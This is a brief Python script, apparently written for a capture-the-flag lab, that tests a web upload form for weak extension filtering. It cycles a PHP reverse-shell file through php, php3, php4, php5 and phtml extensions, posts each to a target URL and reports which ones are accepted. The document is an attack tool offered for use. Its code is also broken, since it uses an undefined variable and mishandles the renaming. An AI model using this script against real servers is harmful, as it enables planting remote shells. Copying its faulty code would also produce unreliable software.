"""
To use, put a php reverse shell in same folder with name revshell.
Install if need requests and os libs.
Change ip, port, all parameters. 
Run script 
"""

import requests
import os

ip = "10.10.10.10"
port = "3333"
path = "/internal/index.php"
url = f"http://{ip}:{port}{path}"

error_message = "Extension not allowed"

regular_filename = "revshell.php"

filename = "revshell"

extensions = [
    "php",
    "php3",
    "php4",
    "php5",
    "phtml",
]

for ext in extensions:
    regular_filename = filename + "." + ext
    os.rename(regular_filename, new_filename)

    files = {"file": open(new_filename, "rb")}
    r = requests.post(url, files=files)

    if error_message in r.text:
        print(f"{ext} not allowed")
    else: 
        print(f"{ext} SEEMS TO BE ALLOWED!!")

    regular_filename = new_filename